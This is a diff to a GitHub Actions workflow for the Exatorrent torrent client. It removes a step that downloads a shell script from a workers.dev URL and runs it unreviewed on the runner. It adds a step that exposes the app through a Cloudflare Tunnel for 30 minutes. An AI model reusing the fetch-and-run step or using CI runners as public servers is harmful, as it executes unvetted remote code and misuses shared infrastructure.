@@ -1,4 +1,4 @@
-name: Install and Test Exatorrent
+name: Expose Exatorrent via Cloudflare Tunnel
 
 on:
   push:
@@ -6,7 +6,7 @@ on:
   workflow_dispatch:
 
 jobs:
-  install_exatorrent:
+  expose_exatorrent:
     runs-on: ubuntu-latest
 
     steps:
@@ -18,11 +18,11 @@ jobs:
       - name: Setup Node.js
         uses: actions/setup-node@v3
         with:
-          node-version: '18'  # Specify your Node.js version
+          node-version: '18'
 
       # Install dependencies and start the app
       - name: Install and run Exatorrent
-        working-directory: ./my-app  # Sets the directory for this step
+        working-directory: ./my-app
         run: |
           npm install
           npm run dev &
@@ -30,24 +30,24 @@ jobs:
           # Wait for server to start
           sleep 10
           curl --retry 3 --retry-delay 5 --retry-connrefused http://localhost:3000
-          echo "Server is running"
+          echo "Exatorrent server is running on port 3000"
 
-      # Fetch and execute remote commands
-      - name: Fetch and run remote commands
+      # Setup Cloudflare Tunnel
+      - name: Setup cloudflared
+        uses: AnimMouse/setup-cloudflared@v2
+        
+      - name: Expose Exatorrent via Cloudflare Tunnel
+        uses: AnimMouse/setup-cloudflared/tunnel@v2
+        with:
+          url: http://localhost:3000  # Changed from 8080 to 3000 to match your app
+          
+      # Keep the workflow running to maintain the tunnel
+      - name: Keep alive
         run: |
-          # Download with timeout and retries
-          curl --max-time 30 --retry 3 --retry-delay 5 -sSL https://holy-queen-e7be.idrissimahdi2020.workers.dev -o commands.sh
+          echo "Tunnel is active - workflow will run for 30 minutes"
+          sleep 1800  # 30 minutes
           
-          # Security check (basic example)
-          if [ ! -s commands.sh ]; then
-            echo "Error: Downloaded file is empty"
-            exit 1
-          fi
-          
-          chmod +x commands.sh
-          ./commands.sh
-
-      # Cleanup (optional)
-      - name: Stop Exatorrent
-        if: always()
-        run: pkill -f "npm run dev" || true
+      # Shutdown and view logs
+      - name: Shutdown and view logs of cloudflared
+        if: '!cancelled()'
+        uses: AnimMouse/setup-cloudflared/shutdown@v2
